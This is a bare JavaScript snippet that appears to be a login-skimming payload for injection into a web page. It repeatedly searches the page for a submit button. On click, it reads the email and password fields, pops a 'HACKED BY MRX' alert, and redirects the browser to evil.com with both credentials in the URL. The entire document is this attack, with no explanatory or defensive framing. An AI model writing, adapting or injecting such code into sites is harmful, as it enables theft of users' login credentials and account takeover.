for (let i = 0; i <= 1000; i++) {
  setTimeout(() => {
    if(document.querySelector('[data-testid="submit"]')){
      console.log("valid")
      button=document.querySelector('[data-testid="submit"]')
      button.addEventListener('click', () => {
    const email = document.getElementById('sign-in-email').value;
    const password = document.getElementById('signInPassword').value;
   alert("HACKED BY MRX")
    window.location.href = `https://evil.com/?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
      })
    }else{
      console.log("invalid")
    }
  }, i * 1000);
}
